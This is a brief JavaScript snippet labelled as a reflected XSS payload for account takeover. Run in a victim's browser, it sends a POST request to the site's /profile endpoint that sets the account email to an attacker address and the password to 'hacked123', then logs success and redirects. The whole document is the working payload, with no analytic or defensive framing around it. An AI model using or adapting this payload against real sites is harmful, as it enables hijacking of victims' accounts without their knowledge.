// External Reflected XSS Payload for Account Takeover 

fetch('/profile', { 
    method: 'POST', 
    headers: { 
        'Content-Type': 'application/x-www-form-urlencoded'  
    }, 
    body: 'email=hacked%40attacker.com&password=hacked123' 
}).then(() =>{ 
    console.log('[XSS] Account credentials successfully updated!'); 
    window.location.href = '/profile'; 
});